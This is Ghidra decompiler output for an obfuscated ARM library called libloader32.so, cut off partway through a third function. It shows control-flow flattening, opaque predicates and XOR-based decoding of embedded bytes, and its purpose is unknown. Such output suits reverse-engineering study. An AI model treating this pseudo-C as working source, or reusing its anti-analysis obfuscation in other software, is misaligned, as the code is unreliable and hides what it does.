// program: libloader32.so
// language: ARM:LE:32:v8
// exported by ExportDecompiled.java via Ghidra headless

// ---- 00015370  entry  size=108

/* WARNING: Control flow encountered bad instruction data */

void processEntry entry(void)

{
  __libc_init();
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 0001545c  FUN_0001545c  size=2548

/* WARNING: Control flow encountered bad instruction data */

void FUN_0001545c(int param_1,int *param_2)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  byte bVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  uint uVar7;
  uint uVar8;
  int iVar9;
  int iVar10;
  undefined4 uVar11;
  uint uVar12;
  uint uVar13;
  uint uVar14;
  uint uVar15;
  uint uVar16;
  uint uVar17;
  int extraout_r1;
  uint uVar18;
  uint uVar19;
  int iVar20;
  undefined4 *puVar21;
  bool bVar22;
  undefined4 in_cr2;
  
  iVar9 = *(int *)(DAT_00015fcc + 0x1547c);
  DataMemoryBarrier(0xb);
  uVar18 = *(uint *)(DAT_00015fd4 + 0x154a4) ^ uRam00015e44;
  uVar16 = *(uint *)(DAT_00015fd0 + 0x15498) ^ uRam00015e4c;
  FUN_00035060((uVar16 | uVar18) * (uVar16 & uVar18) +
               (uVar16 & (*(uint *)(DAT_00015fd4 + 0x154a4) ^ uRam00015e48)) *
               (uVar18 & (*(uint *)(DAT_00015fd0 + 0x15498) ^ uRam00015e40)),DAT_00015e50);
  uVar12 = DAT_00015e64;
  iVar20 = DAT_00015e60;
  uVar11 = DAT_00015e5c;
  uVar18 = DAT_00015e58;
  uVar16 = DAT_00015e54;
  do {
    iVar10 = FUN_00035060((*(uint *)(DAT_00015fdc + 0x154fc) ^ uVar18) +
                          (*(uint *)(DAT_00015fd8 + 0x154f0) ^ uVar16),uVar11);
    uVar7 = DAT_00015e80;
    uVar6 = DAT_00015e7c;
    uVar5 = DAT_00015e78;
    uVar19 = DAT_00015e74;
    uVar13 = DAT_00015e70;
    uVar14 = DAT_00015e6c;
    uVar17 = DAT_00015e68;
  } while ((uint)(iVar10 + iVar20) < uVar12);
  do {
    uVar16 = (*(uint *)(DAT_00015fe4 + 0x15548) ^ uVar14) -
             (*(uint *)(DAT_00015fe0 + 0x1553c) ^ uVar17);
    uVar11 = FUN_00035060((uVar16 | uVar19) * (uVar16 & uVar19) +
                          (uVar19 & ~uVar16) * (uVar16 & uVar13),uVar5);
    uVar18 = FUN_00035060(uVar11,uVar6);
    iVar10 = DAT_00015fec;
    iVar20 = DAT_00015fe8;
    uVar16 = DAT_00015e90;
  } while (uVar7 < uVar18);
  if (iVar9 == 0) {
    bVar1 = *(byte *)(DAT_00015fec + 0x155a1);
    *(byte *)(DAT_00015fe8 + 0x15598) = *(byte *)(DAT_00015fec + 0x155a0) ^ 0x59;
    uVar18 = *(uint *)(DAT_00015ff4 + 0x155cc) ^ DAT_00015e88 |
             *(uint *)(DAT_00015ff0 + 0x155bc) ^ DAT_00015e84;
    if (((uVar18 ^ DAT_00015e8c) & uVar18) == DAT_00015e94) goto LAB_00015854;
    while( true ) {
      bVar2 = *(byte *)(iVar10 + 0x155a5);
      *(byte *)(iVar20 + 0x1559a) = *(byte *)(iVar10 + 0x155a2) ^ 0x11;
      *(byte *)(iVar20 + 0x1559d) = bVar2 ^ 0xa2;
      bVar2 = *(byte *)(iVar10 + 0x155a3);
      *(byte *)(iVar20 + 0x155a0) = *(byte *)(iVar10 + 0x155a8) ^ 0x2e;
      bVar3 = *(byte *)(iVar10 + 0x155a4);
      *(byte *)(iVar20 + 0x1559b) = ~bVar2 & 0x7d | bVar2 & 0x82;
      *(byte *)(iVar20 + 0x1559e) =
           ~*(byte *)(iVar10 + 0x155a6) & 0xef | *(byte *)(iVar10 + 0x155a6) & 0x10;
      *(byte *)(iVar20 + 0x15599) = ~((bVar1 | 0xb) & (~bVar1 | 0xf4));
      *(byte *)(iVar20 + 0x1559c) = ~(bVar3 & 0x52 | ~bVar3 & 0xad);
      *(byte *)(iVar20 + 0x1559f) =
           ~(*(byte *)(iVar10 + 0x155a7) & 0x8b | ~*(byte *)(iVar10 + 0x155a7) & 0x74);
      uVar17 = *(uint *)(DAT_00015ff8 + 0x156ac);
      uVar12 = *(uint *)(DAT_00015ffc + 0x156b4);
      *(byte *)(iVar20 + 0x155a1) =
           ~*(byte *)(iVar10 + 0x155a9) & 0x2c | *(byte *)(iVar10 + 0x155a9) & 0xd3;
      bVar2 = *(byte *)(iVar10 + 0x155ac);
      *(byte *)(iVar20 + 0x155a2) = *(byte *)(iVar10 + 0x155aa) ^ 0x34;
      *(byte *)(iVar20 + 0x155a4) = bVar2 ^ 0x8d;
      bVar2 = *(byte *)(iVar10 + 0x155ab);
      *(byte *)(iVar20 + 0x155a7) = *(byte *)(iVar10 + 0x155af) ^ 0x47;
      bVar3 = *(byte *)(iVar10 + 0x155ad);
      *(byte *)(iVar20 + 0x155a9) = *(byte *)(iVar10 + 0x155b1) ^ 0x45;
      bVar4 = *(byte *)(iVar10 + 0x155b6);
      *(byte *)(iVar20 + 0x155aa) = *(byte *)(iVar10 + 0x155b2) ^ 0x83;
      *(byte *)(iVar20 + 0x155a3) = bVar2 + (bVar2 & 0x66) * -2 + 'f';
      bVar2 = *(byte *)(iVar10 + 0x155b4);
      *(byte *)(iVar20 + 0x155a5) = bVar3 + (bVar3 & 0x29) * -2 + ')';
      *(byte *)(iVar20 + 0x155ac) = bVar2 ^ 0x73;
      *(byte *)(iVar20 + 0x155ae) = bVar4 ^ 5;
      bVar2 = *(byte *)(iVar10 + 0x155ae);
      *(byte *)(iVar20 + 0x155af) = *(byte *)(iVar10 + 0x155b7) ^ 0x2e;
      *(byte *)(iVar20 + 0x155b0) = *(byte *)(iVar10 + 0x155b8) ^ 0xa2;
      bVar3 = *(byte *)(iVar10 + 0x155ba);
      *(byte *)(iVar20 + 0x155a6) = (~bVar2 | 0xd3) & (bVar2 | 0x2c);
      *(byte *)(iVar20 + 0x155b2) = bVar3 ^ 0x26;
      bVar2 = *(byte *)(iVar10 + 0x155b0);
      *(byte *)(iVar20 + 0x155b3) = *(byte *)(iVar10 + 0x155bb) ^ 0x1c;
      bVar3 = *(byte *)(iVar10 + 0x155b3);
      *(byte *)(iVar20 + 0x155b1) =
           ~*(byte *)(iVar10 + 0x155b9) & 0x38 | *(byte *)(iVar10 + 0x155b9) & 199;
      *(byte *)(iVar20 + 0x155a8) = ~(bVar2 & 0x4c | ~bVar2 & 0xb3);
      bVar2 = *(byte *)(iVar10 + 0x155b5);
      *(byte *)(iVar20 + 0x155ab) = bVar3 + (bVar3 & 0x24) * -2 + -0x5c;
      uVar18 = DAT_00015e9c;
      *(byte *)(iVar20 + 0x155ad) = bVar2 + (bVar2 & 0x5b) * -2 + '[';
      uVar17 = uVar17 ^ uVar18;
      *(byte *)(iVar20 + 0x155b4) = *(byte *)(iVar10 + 0x155bc) ^ 0xae;
      *(byte *)(iVar20 + 0x155b5) = *(byte *)(iVar10 + 0x155bd) ^ 0xe6;
      uVar18 = ((uVar16 ^ uVar16 + 2) * (uVar17 & (uVar12 ^ DAT_00015e98)) -
               (uVar12 ^ uVar17 ^ DAT_00015ea0)) + DAT_00015ea4;
      uVar18 = FUN_00035060((DAT_00015eac & ~uVar18 | uVar18 & DAT_00015ea8) ^ DAT_00015eb0,
                            DAT_00015eb4);
      if (uVar18 <= DAT_00015eb8) break;
LAB_00015854:
      *(byte *)(iVar20 + 0x15599) = bVar1 ^ 0xf4;
      bVar2 = *(byte *)(iVar10 + 0x155a3);
      *(byte *)(iVar20 + 0x1559a) = *(byte *)(iVar10 + 0x155a2) ^ 0x11;
      *(byte *)(iVar20 + 0x1559b) = bVar2 ^ 0x7d;
      bVar2 = *(byte *)(iVar10 + 0x155a4);
      *(byte *)(iVar20 + 0x155a1) = *(byte *)(iVar10 + 0x155a9) ^ 0x2c;
      bVar3 = *(byte *)(iVar10 + 0x155a5);
      *(byte *)(iVar20 + 0x155a0) =
           ~*(byte *)(iVar10 + 0x155a8) & 0x2e | *(byte *)(iVar10 + 0x155a8) & 0xd1;
      *(byte *)(iVar20 + 0x155a2) =
           ~*(byte *)(iVar10 + 0x155aa) & 0x34 | *(byte *)(iVar10 + 0x155aa) & 0xcb;
      bVar4 = *(byte *)(iVar10 + 0x155ad);
      *(byte *)(iVar20 + 0x1559c) = bVar2 + (bVar2 & 0x52) * -2 + 'R';
      bVar2 = *(byte *)(iVar10 + 0x155ae);
      *(byte *)(iVar20 + 0x1559d) = (~bVar3 | 0x5d) & (bVar3 | 0xa2);
      *(byte *)(iVar20 + 0x1559e) =
           *(byte *)(iVar10 + 0x155a6) + (*(byte *)(iVar10 + 0x155a6) & 0x6f) * -2 + -0x11;
      bVar3 = *(byte *)(iVar10 + 0x155ac);
      *(byte *)(iVar20 + 0x1559f) =
           *(byte *)(iVar10 + 0x155a7) + (*(byte *)(iVar10 + 0x155a7) & 0xb) * -2 + -0x75;
      *(byte *)(iVar20 + 0x155a4) = bVar3 ^ 0x8d;
      *(byte *)(iVar20 + 0x155a5) = bVar4 ^ 0x29;
      bVar3 = *(byte *)(iVar10 + 0x155ab);
      *(byte *)(iVar20 + 0x155a8) = *(byte *)(iVar10 + 0x155b0) ^ 0x4c;
      bVar4 = *(byte *)(iVar10 + 0x155b6);
      *(byte *)(iVar20 + 0x155a9) = *(byte *)(iVar10 + 0x155b1) ^ 0x45;
      *(byte *)(iVar20 + 0x155ab) = *(byte *)(iVar10 + 0x155b3) ^ 0xa4;
      *(byte *)(iVar20 + 0x155a3) = ~(bVar3 & 0x66 | ~bVar3 & 0x99);
      bVar3 = *(byte *)(iVar10 + 0x155b8);
      *(byte *)(iVar20 + 0x155a6) = bVar2 + (bVar2 & 0x2c) * -2 + ',';
      bVar2 = *(byte *)(iVar10 + 0x155b2);
      *(byte *)(iVar20 + 0x155b0) = bVar3 ^ 0xa2;
      bVar3 = *(byte *)(iVar10 + 0x155b9);
      *(byte *)(iVar20 + 0x155aa) = bVar2 + (bVar2 & 3) * -2 + -0x7d;
      bVar2 = *(byte *)(iVar10 + 0x155af);
      *(byte *)(iVar20 + 0x155b1) = bVar3 ^ 0x38;
      *(byte *)(iVar20 + 0x155b2) = *(byte *)(iVar10 + 0x155ba) ^ 0x26;
      *(byte *)(iVar20 + 0x155a7) = ~((bVar2 | 0xb8) & (~bVar2 | 0x47));
      bVar2 = *(byte *)(iVar10 + 0x155b4);
      *(byte *)(iVar20 + 0x155ae) = ~bVar4 & 5 | bVar4 & 0xfa;
      bVar3 = *(byte *)(iVar10 + 0x155b5);
      *(byte *)(iVar20 + 0x155b3) =
           ~*(byte *)(iVar10 + 0x155bb) & 0x1c | *(byte *)(iVar10 + 0x155bb) & 0xe3;
      *(byte *)(iVar20 + 0x155ac) = (~bVar2 | 0x8c) & (bVar2 | 0x73);
      bVar2 = *(byte *)(iVar10 + 0x155b7);
      *(byte *)(iVar20 + 0x155ad) = (~bVar3 & 0x44 | bVar3 & 0xbb) ^ 0x1f;
      *(byte *)(iVar20 + 0x155af) = (~bVar2 & 0xd3 | bVar2 & 0x2c) ^ 0xfd;
      *(byte *)(iVar20 + 0x155b4) =
           *(byte *)(iVar10 + 0x155bc) + (*(byte *)(iVar10 + 0x155bc) & 0x2e) * -2 + -0x52;
      *(byte *)(iVar20 + 0x155b5) =
           *(byte *)(iVar10 + 0x155bd) + (*(byte *)(iVar10 + 0x155bd) & 0x66) * -2 + -0x1a;
    }
  }
  uVar16 = *(uint *)(DAT_00016000 + 0x15a84) ^ DAT_00015ebc;
  uVar12 = *(uint *)(DAT_00016004 + 0x15a90) ^ DAT_00015ec0;
  puVar21 = (undefined4 *)(DAT_00016008 + 0x15aa4);
  uVar18 = *(uint *)(DAT_00016000 + 0x15a84) ^ DAT_00015ec4;
  uVar16 = (uVar12 | uVar18) * (uVar12 & uVar18) + ~(uVar12 | uVar16) * (uVar12 & uVar16);
  uVar16 = DAT_00015ecc & ~uVar16 | uVar16 & DAT_00015ec8;
  uVar13 = (uVar16 | DAT_00015ed0) * (uVar16 & DAT_00015ed0) +
           (uVar16 & DAT_00015ed4) * (DAT_00015ed0 & ~uVar16);
  uVar16 = DAT_00015f00;
  iVar20 = DAT_00015efc;
  uVar18 = DAT_00015ef8;
  iVar9 = DAT_00015ef4;
  uVar12 = DAT_00015ef0;
  uVar17 = DAT_00015eec;
  uVar14 = DAT_00015ee8;
  if ((uVar13 | DAT_00015edc) * (uVar13 & DAT_00015ee0) +
      (DAT_00015edc & ~uVar13) * (uVar13 & DAT_00015ed8) < DAT_00015ee4) {
    DataMemoryBarrier(0xb);
    *puVar21 = 1;
    uVar16 = DAT_00015f00;
    iVar20 = DAT_00015efc;
    uVar18 = DAT_00015ef8;
    iVar9 = DAT_00015ef4;
    uVar12 = DAT_00015ef0;
    uVar17 = DAT_00015eec;
    uVar14 = DAT_00015ee8;
  }
  do {
    uVar13 = *(uint *)(DAT_0001600c + 0x15b60);
    uVar19 = *(uint *)(DAT_00016010 + 0x15b6c);
    DataMemoryBarrier(0xb);
    *puVar21 = 1;
    uVar13 = (uVar13 ^ uVar12 | uVar19 ^ uVar17) * iVar9;
  } while ((uVar13 - (uVar14 + 2 ^ uVar14) * (uVar13 & uVar18)) + iVar20 < uVar16);
  uVar14 = ((*(uint *)(DAT_00016018 + 0x15bb0) ^ DAT_00015f08 |
            *(uint *)(DAT_00016014 + 0x15ba0) ^ DAT_00015f04) ^ DAT_00015f0c) + DAT_00015f10;
  uVar16 = DAT_00015f44;
  uVar18 = DAT_00015f40;
  uVar12 = DAT_00015f3c;
  uVar17 = DAT_00015f38;
  if ((DAT_00015f18 & ~uVar14 | uVar14 & DAT_00015f14) == DAT_00015f1c) {
    FUN_00016048(param_2);
    uVar16 = DAT_00015f44;
    uVar18 = DAT_00015f40;
    uVar12 = DAT_00015f3c;
    uVar17 = DAT_00015f38;
  }
  do {
    uVar13 = *(uint *)(DAT_0001601c + 0x15c10);
    uVar14 = *(uint *)(DAT_00016020 + 0x15c18);
    FUN_00016048(param_2);
    iVar9 = FUN_00035060((uVar13 ^ DAT_00015f28) * (uVar14 ^ DAT_00015f24),DAT_00015f2c);
    uVar8 = DAT_00015f60;
    uVar7 = DAT_00015f5c;
    iVar20 = DAT_00015f58;
    uVar11 = DAT_00015f54;
    uVar19 = DAT_00015f50;
    uVar13 = DAT_00015f4c;
    uVar14 = DAT_00015f48;
    uVar15 = iVar9 + DAT_00015f30;
  } while (((uVar17 & ~uVar15 | uVar15 & DAT_00015f34) ^ uVar12 | uVar15 & uVar18) == uVar16);
  uVar16 = DAT_00015f20 ^ DAT_00015f20 + 1;
  do {
    uVar18 = *(uint *)(DAT_00016024 + 0x15c98) ^ uVar13;
    uVar12 = *(uint *)(DAT_00016028 + 0x15ca4) ^ uVar19;
    iVar9 = FUN_00035060((uVar12 & uVar18) * (uVar14 ^ uVar14 + 2) + (uVar12 ^ uVar18),uVar11);
  } while (uVar8 < (iVar9 + iVar20 & uVar7));
  if ((int)uVar16 <= param_1) {
    uVar16 = (*(uint *)(DAT_00016030 + 0x15d04) ^ DAT_00015f68) +
             (*(uint *)(DAT_0001602c + 0x15cf4) ^ DAT_00015f64) & DAT_00015f6c;
    do {
    } while (DAT_00015f7c < ((uVar16 | DAT_00015f74) & (uVar16 ^ DAT_00015f70)) + DAT_00015f78);
    uVar16 = *(uint *)(DAT_00016038 + 0x15d5c) ^ *(uint *)(DAT_00016034 + 0x15d4c);
    do {
      uVar18 = (uVar16 ^ DAT_00015f80) * DAT_00015f84;
      iVar20 = (uVar18 & DAT_00015f8c) * (DAT_00015f88 & ~uVar18);
    } while ((~((uVar18 | DAT_00015f88) * (uVar18 & DAT_00015f90) + iVar20) | DAT_00015f94) <
             DAT_00015f98);
    bVar22 = *param_2 == 0;
    if (!bVar22) {
      FUN_00016be8(*param_2,param_1,param_2);
      if (!bVar22) {
        *(char *)(extraout_r1 + 0xe4a) = (char)iVar20;
      }
      coprocessor_load(0xd,in_cr2,uVar16);
                    /* WARNING: Bad instruction - Truncating control flow here */
      halt_baddata();
    }
  }
  uVar18 = *(uint *)(DAT_00016040 + 0x15dc0) ^ DAT_00015fa0;
  uVar16 = *(uint *)(DAT_0001603c + 0x15db4) ^ DAT_00015fa8;
  uVar18 = (uVar16 | uVar18) * (uVar16 & uVar18) +
           (uVar16 & (*(uint *)(DAT_00016040 + 0x15dc0) ^ DAT_00015fa4)) *
           (uVar18 & (*(uint *)(DAT_0001603c + 0x15db4) ^ DAT_00015f9c)) + DAT_00015fac;
  uVar16 = DAT_00015fc8;
  if (DAT_00015fc0 <
      ((uVar18 ^ DAT_00015fb8) & DAT_00015fbc) - ((uVar18 ^ DAT_00015fb0) & DAT_00015fb4)) {
    uVar16 = DAT_00015fc4;
  }
                    /* WARNING: Subroutine does not return */
  FUN_00027cf0((uVar16 | 1) ^ uVar16,DAT_00016044 + 0x15e38);
}



// ---- 00016048  FUN_00016048  size=2360

void FUN_00016048(int param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  undefined4 uVar4;
  int iVar5;
  int iVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  int iVar14;
  int local_68;
  int local_60 [2];
  char local_58 [8];
  int local_50 [2];
  uint local_48 [2];
  int local_40;
  uint *local_3c;
  char *local_38;
  int *local_34;
  int *local_30;
  int local_2c;
  
  local_2c = **(int **)(DAT_00016b6c + 0x16068);
  local_3c = local_48;
  local_34 = local_50;
  local_38 = local_58;
  local_30 = local_60;
  uVar8 = *(uint *)(DAT_00016b74 + 0x160c0) ^ DAT_00016984;
  uVar7 = *(uint *)(DAT_00016b70 + 0x160b4) ^ DAT_0001698c;
  uVar7 = (uVar7 | uVar8) * (uVar7 & uVar8) +
          (uVar7 & (*(uint *)(DAT_00016b74 + 0x160c0) ^ DAT_00016988)) *
          (uVar8 & (*(uint *)(DAT_00016b70 + 0x160b4) ^ DAT_00016980));
  uVar7 = (uVar7 | DAT_00016990) * (uVar7 & DAT_00016990) +
          (uVar7 & DAT_00016994) * (DAT_00016990 & ~uVar7);
  local_40 = param_1;
  local_48[0] = FUN_00035060(((DAT_000169a0 | 2) ^ DAT_000169a0) * (uVar7 & DAT_0001699c) -
                             (uVar7 ^ DAT_00016998),DAT_000169a4);
  iVar2 = DAT_000169c8;
  iVar1 = DAT_000169b8;
  local_68 = 0x3b8c4000;
  local_40 = local_40 + -4;
  iVar6 = DAT_000169ec;
  iVar10 = DAT_000169d0;
  iVar11 = DAT_000169b4;
  iVar12 = DAT_00016a00;
  iVar13 = DAT_000169f0;
  iVar14 = DAT_000169bc;
  iVar3 = local_68;
  do {
    while( true ) {
      while( true ) {
        while( true ) {
          while( true ) {
            do {
              while( true ) {
                while( true ) {
                  while( true ) {
                    while( true ) {
                      while( true ) {
                        while( true ) {
                          while( true ) {
                            while( true ) {
                              while( true ) {
                                while( true ) {
                                  while( true ) {
                                    while( true ) {
                                      while( true ) {
                                        while( true ) {
                                          while( true ) {
                                            while( true ) {
                                              while( true ) {
                                                do {
                                                  while( true ) {
                                                    do {
                                                      while (local_68 = iVar3, uVar7 = DAT_00016a7c,
                                                            local_68 == iVar11) {
                                                        uVar7 = (*(uint *)(DAT_00016bd0 + 0x165a4) ^
                                                                DAT_00016a54) *
                                                                (*(uint *)(DAT_00016bcc + 0x16598) ^
                                                                DAT_00016a50);
                                                        iVar3 = iVar2;
                                                        if (((uVar7 ^ DAT_00016a58) & uVar7 |
                                                            DAT_00016a5c) < DAT_00016a60) {
                                                          iVar3 = -0x7fe27210;
                                                        }
                                                      }
                                                      iVar3 = iVar10;
                                                    } while (local_68 == iVar1);
                                                    if (local_68 != iVar14) break;
                                                    iVar3 = DAT_00016a04;
                                                    if (*local_38 != '\0') {
                                                      iVar3 = 0x147b12da;
                                                    }
                                                  }
                                                } while ((local_68 == DAT_000169c0) ||
                                                        (iVar3 = iVar6, local_68 == DAT_000169c4));
                                                if (local_68 != iVar2) break;
                                                local_68 = DAT_00016a04;
                                                iVar3 = local_68;
                                              }
                                              if (local_68 != DAT_000169cc) break;
                                              *(int *)(DAT_00016bb8 + 0x168f0) = *local_30;
                                              iVar6 = FUN_00035060(*(uint *)(DAT_00016bbc + 0x16900)
                                                                   ^ DAT_00016a78,
                                                                   *(uint *)(DAT_00016bc0 + 0x1690c)
                                                                   ^ uVar7);
                                              uVar7 = FUN_00035060(iVar6 + DAT_00016a80,DAT_00016a84
                                                                  );
                                              iVar6 = DAT_000169ec;
                                              iVar10 = DAT_000169d0;
                                              iVar11 = DAT_000169b4;
                                              iVar13 = DAT_000169f0;
                                              iVar14 = DAT_000169bc;
                                              iVar3 = DAT_000169cc;
                                              if ((uVar7 ^ DAT_00016a88) < DAT_00016a8c) {
                                                iVar3 = -0xf326b04;
                                              }
                                            }
                                            if (local_68 != iVar10) break;
                                            *local_38 = *local_34 == 0;
                                            uVar7 = *(uint *)(DAT_00016b88 + 0x16458) ^ DAT_00016b1c
                                            ;
                                            uVar8 = *(uint *)(DAT_00016b8c + 0x16464) ^ DAT_00016b20
                                            ;
                                            uVar7 = (uVar8 & uVar7) + (uVar8 | uVar7);
                                            uVar7 = (~uVar7 | DAT_00016b28) & (uVar7 | DAT_00016b24)
                                            ;
                                            uVar8 = ~uVar7;
                                            uVar9 = uVar8 | DAT_00016b30;
                                            iVar6 = DAT_000169ec;
                                            iVar11 = DAT_000169b4;
                                            iVar12 = DAT_00016a00;
                                            iVar13 = DAT_000169f0;
                                            iVar3 = DAT_000169d4;
                                            if ((uVar8 | DAT_00016b38) * (uVar9 & DAT_00016b3c) +
                                                (uVar7 & DAT_00016b2c) * (uVar9 & DAT_00016b34) ==
                                                DAT_00016b40) {
                                              iVar3 = -0x19f46403;
                                            }
                                          }
                                          if (local_68 != DAT_000169d4) break;
                                          local_68 = DAT_000169f8;
                                          iVar3 = local_68;
                                        }
                                        if (local_68 != DAT_000169d8) break;
                                        local_68 = DAT_000169e8;
                                        iVar3 = local_68;
                                      }
                                      if (local_68 != DAT_000169dc) break;
                                      iVar6 = DAT_000169ec;
                                      iVar12 = DAT_00016a00;
                                      iVar13 = DAT_000169f0;
                                      iVar3 = iVar14;
                                      if (((*(uint *)(DAT_00016b98 + 0x165e8) ^ DAT_00016af0) &
                                           (*(uint *)(DAT_00016b9c + 0x165fc) ^ DAT_00016aec) |
                                          (*(uint *)(DAT_00016b9c + 0x165fc) ^ DAT_00016ae8) &
                                          (*(uint *)(DAT_00016b98 + 0x165e8) ^ DAT_00016ae4)) *
                                          DAT_00016af8 + DAT_00016af4 < DAT_00016afc) {
                                        iVar3 = -0xe5aa4ac;
                                      }
                                    }
                                    if (local_68 != DAT_000169e0) break;
                                    local_68 = DAT_000169fc;
                                    iVar3 = local_68;
                                  }
                                  if (local_68 != DAT_000169e4) break;
                                  uVar7 = *(uint *)(DAT_00016ba0 + 0x167fc) ^ DAT_00016ac8;
                                  uVar8 = *(uint *)(DAT_00016ba4 + 0x16818) ^ DAT_00016acc;
                                  uVar7 = uVar8 + (uVar7 - (DAT_000169a8 + 2 ^ DAT_000169a8) *
                                                           (uVar7 & ~(uVar8 ^ uVar7))) |
                                          DAT_00016ad0;
                                  uVar8 = uVar7 & DAT_00016ad4;
                                  iVar6 = DAT_000169ec;
                                  iVar12 = DAT_00016a00;
                                  iVar3 = DAT_00016a10;
                                  if ((uVar8 + (uVar8 ^ DAT_00016ad8)) - (uVar7 & DAT_00016adc) <
                                      DAT_00016ae0) {
                                    iVar3 = 0x6ce754df;
                                  }
                                }
                                if (local_68 != DAT_000169e8) break;
                                uVar4 = FUN_00035060(*(uint *)(DAT_00016bc4 + 0x16880) ^
                                                     DAT_00016a64,
                                                     *(uint *)(DAT_00016bc8 + 0x1688c) ^
                                                     DAT_00016a68);
                                uVar4 = FUN_00035060(uVar4,DAT_00016a6c);
                                iVar5 = FUN_00035060(uVar4,DAT_00016a70);
                                iVar6 = DAT_000169ec;
                                iVar10 = DAT_000169d0;
                                iVar11 = DAT_000169b4;
                                iVar13 = DAT_000169f0;
                                iVar14 = DAT_000169bc;
                                iVar3 = DAT_000169b4;
                                if (iVar5 == DAT_00016a74) {
                                  iVar3 = 0x4f9698d8;
                                }
                              }
                              if (local_68 != iVar6) break;
                              uVar7 = ((*(uint *)(DAT_00016be0 + 0x16318) ^ DAT_00016a24) -
                                      (*(uint *)(DAT_00016bdc + 0x16308) ^ DAT_00016a20)) *
                                      DAT_00016a28;
                              iVar13 = DAT_000169f0;
                              iVar3 = DAT_00016a1c;
                              if (DAT_00016a38 <
                                  (uVar7 | DAT_00016a2c) * (uVar7 & DAT_00016a2c) +
                                  (uVar7 & DAT_00016a30) * (DAT_00016a2c & ~uVar7) +
                                  (DAT_000169ac + 1 ^ DAT_000169ac) + DAT_00016a34) {
                                iVar3 = 0x1e854f2f;
                              }
                            }
                            if (local_68 != iVar13) break;
                            local_68 = iVar1;
                            iVar3 = local_68;
                          }
                          if (local_68 != DAT_000169f4) break;
                          uVar7 = (*(uint *)(DAT_00016bb4 + 0x16788) ^ DAT_00016a94 |
                                  *(uint *)(DAT_00016bb0 + 0x16774) ^ DAT_00016a90) +
                                  (*(uint *)(DAT_00016bb4 + 0x16788) ^ DAT_00016a98) +
                                  (DAT_000169b0 ^ DAT_000169b0 + 1) + DAT_00016a9c;
                          iVar6 = DAT_000169ec;
                          iVar12 = DAT_00016a00;
                          iVar3 = DAT_00016a0c;
                          if (DAT_00016aa8 <
                              (uVar7 | DAT_00016aa0) * (uVar7 & DAT_00016aa0) +
                              (uVar7 & DAT_00016aa4) * (DAT_00016aa0 & ~uVar7)) {
                            iVar3 = -0x1a986b68;
                          }
                        }
                        if (local_68 != DAT_000169f8) break;
                        uVar4 = FUN_00035060(*(uint *)(DAT_00016b90 + 0x16388) ^ DAT_00016b00,
                                             *(uint *)(DAT_00016b94 + 0x16394) ^ DAT_00016b04);
                        iVar5 = FUN_00035060(uVar4,DAT_00016b08);
                        iVar6 = DAT_000169ec;
                        iVar10 = DAT_000169d0;
                        iVar11 = DAT_000169b4;
                        iVar13 = DAT_000169f0;
                        iVar14 = DAT_000169bc;
                        iVar3 = DAT_000169dc;
                        if (((iVar5 * DAT_00016b0c | DAT_00016b10) &
                            (~(iVar5 * DAT_00016b0c) | DAT_00016b14)) == DAT_00016b18) {
                          iVar3 = 0x7a56b2e6;
                        }
                      }
                      if (local_68 != 0x3b8c4000) break;
                      iVar3 = DAT_000169e0;
                      if (*local_3c < DAT_00016b68) {
                        iVar3 = 0x3d4d965f;
                      }
                    }
                    if (local_68 != DAT_000169fc) break;
                    *local_34 = *(int *)(DAT_00016b7c + 0x166dc);
                    uVar7 = (*(uint *)(DAT_00016b84 + 0x166fc) ^ DAT_00016b48) +
                            (*(uint *)(DAT_00016b80 + 0x166f0) ^ DAT_00016b44);
                    uVar7 = ((DAT_00016b50 & ~uVar7 | uVar7 & DAT_00016b4c) ^ DAT_00016b54) +
                            DAT_00016b58;
                    iVar3 = DAT_000169e0;
                    if ((uVar7 & DAT_00016b60) - (DAT_00016b5c & ~uVar7) != DAT_00016b64) {
                      iVar3 = 0x22af5f5f;
                    }
                  }
                  if (local_68 != iVar12) break;
                  local_68 = DAT_000169f4;
                  iVar3 = local_68;
                }
                if (local_68 != DAT_00016a04) break;
                if (DAT_00016a4c <
                    (*(uint *)(DAT_00016bd8 + 0x16674) ^ *(uint *)(DAT_00016bd4 + 0x1666c) ^
                     DAT_00016a3c | DAT_00016a40) * DAT_00016a48 + DAT_00016a44) {
                  iVar3 = -0x4d3f07bd;
                }
              }
              iVar3 = iVar11;
            } while (local_68 == DAT_00016a08);
            if (local_68 != DAT_00016a0c) break;
            *(int *)(DAT_00016be4 + 0x164ec) = *local_30;
            local_68 = DAT_000169cc;
            iVar3 = local_68;
          }
          if (local_68 != DAT_00016a10) break;
          local_68 = DAT_00016a14;
          iVar3 = local_68;
        }
        if (local_68 != DAT_00016a14) break;
        *local_30 = local_40;
        uVar7 = ((*(uint *)(DAT_00016bac + 0x16528) ^ DAT_00016ab0) +
                (*(uint *)(DAT_00016ba8 + 0x1651c) ^ DAT_00016aac)) * DAT_00016ab4;
        iVar3 = DAT_00016a14;
        if (DAT_00016ac4 < ((uVar7 | DAT_00016abc) & DAT_00016ac0) + (uVar7 | DAT_00016ab8)) {
          iVar3 = 0x469a793c;
        }
      }
      if (local_68 != DAT_00016a18) break;
      local_68 = DAT_000169dc;
      iVar3 = local_68;
    }
    iVar3 = local_68;
  } while (local_68 != DAT_00016a1c);
  if (**(int **)(DAT_00016b78 + 0x1696c) != local_2c) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}



// ---- 00020054  FUN_00020054  size=6420

void FUN_00020054(int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  byte bVar4;
  byte bVar5;
  undefined uVar6;
  int iVar7;
  undefined4 uVar8;
  uint uVar9;
  uint uVar10;
  undefined4 uVar11;
  int iVar12;
  uint uVar13;
  uint uVar14;
  byte *pbVar15;
  int iVar16;
  int iVar17;
  undefined4 uVar18;
  byte *pbVar19;
  uint uVar20;
  uint uVar21;
  byte *pbVar22;
  uint uVar23;
  undefined *puVar24;
  uint uVar25;
  byte *pbVar26;
  int iVar27;
  uint uVar28;
  uint uVar29;
  int *piVar30;
  undefined4 *puVar31;
  uint uVar32;
  int *piVar33;
  int iVar34;
  undefined auStack_40 [4];
  undefined4 local_3c;
  int local_38;
  undefined4 local_34;
  undefined4 local_30;
  int local_2c;
  
  iVar34 = DAT_0002097c;
